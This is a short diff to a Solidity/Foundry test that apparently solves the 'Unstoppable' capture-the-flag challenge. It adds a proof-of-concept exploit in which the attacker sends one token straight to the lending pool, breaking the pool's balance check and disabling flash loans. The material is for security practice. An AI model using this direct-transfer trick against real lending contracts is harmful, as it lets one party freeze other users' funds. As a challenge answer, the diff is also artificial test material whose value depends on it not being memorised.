@@ -56,6 +56,9 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.prank(attacker);
+        // only place where pool balance is increased is in deposit function when forcefully it is not incremented and therefore breaks the not equal check in flash loan function.
+        dvt.transfer(address(unstoppableLender),1);
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
